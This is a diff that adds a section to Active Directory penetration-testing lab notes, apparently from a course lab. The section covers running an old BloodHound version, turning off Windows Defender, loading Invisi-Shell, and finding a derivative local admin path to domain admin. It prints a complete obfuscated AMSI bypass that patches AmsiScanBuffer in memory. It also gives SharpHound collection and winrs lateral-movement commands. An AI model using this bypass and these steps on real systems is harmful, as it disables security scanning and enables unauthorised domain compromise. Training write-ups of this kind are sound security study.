@@ -545,6 +545,124 @@ C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
 ### **BloodHound Old Setup**
 
 
+**The latest version of BloodHound (4.2.0) does not show Derivate Local Admin edge in GUI. The last version where it worked was 4.0.3. It is present in the Tools directory as BloodHound-4.0.3_old. You can use it the same way as above.**
+
+- Make sure the **neo4j** UI is still turned off, but you can turn off the newer bloodhound
+- Change directory to the old bloodhound using MS-DOS and start up bloodhound
+
+
+```powershell
+cd C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-win32-x64
+.\BloodHound.exe
+```
+
+
+- Now since we have local administrator privileges, go ahead and turn off antivirus (Both **Real time protection** and **Tamper Protection**) using GUI
+- Open another powershell session with local administrative privileges and load **Invisi-shell**
+
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
+cd C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors
+```
+
+- Bypass  **.NET AMSI Bypass** with the script below :
+
+```powershell
+$ZQCUW = @"
+using System;
+using System.Runtime.InteropServices;
+public class ZQCUW {
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string
+procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
+dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+Add-Type $ZQCUW
+$BBWHVWQ =
+[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
+;&#105;&#46;&#100;&#108;&#108;'))")
+$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
+"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
+;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
+$p = 0
+[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
+$TLML = "0xB8"
+$PURX = "0x57"
+$YNWL = "0x00"
+$RTGX = "0x07"
+$XVON = "0x80"
+$WRUD = "0xC3"
+$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
+[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
+```
+
+
+- Start BloodHound collector, to gather data
+
+
+```powershell
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+```
+
+
+
+- Now clear the database if there is any data available from the old bloodhound UI
+- Navigate to the bloodhound collector directory on the GUI and drag and drop the zip file to Bloodhound_old UI
+
+```
+Location:
+
+C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors
+```
+
+
+
+### **Shortest path to Domain Admins in the dollarcorp domain - bloodhound**
+
+
+**Note -: This can only be done with old bloodhound UI**
+
+
+- In Node Info, scroll down to '**LOCAL ADMIN RIGHTS**' and expand '**Derivative Local Admin Rights**' to find if studentx has derivate local admin rights on any machine!
+
+
+![](https://i.imgur.com/zkLtx5h.png)
+
+
+
+- As we can see below `student505` is a member of `RDPUSERS` group and `RDPUSERS` is Admin To `DCORP-ADMINSRV` DC
+
+
+![](https://i.imgur.com/n31oOzy.png)
+
+
+- This means that if we run - `winrs -r:dcorp-adminsrv cmd` - we can actually be domain admin
+
+
+![](https://i.imgur.com/RHI3YZd.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
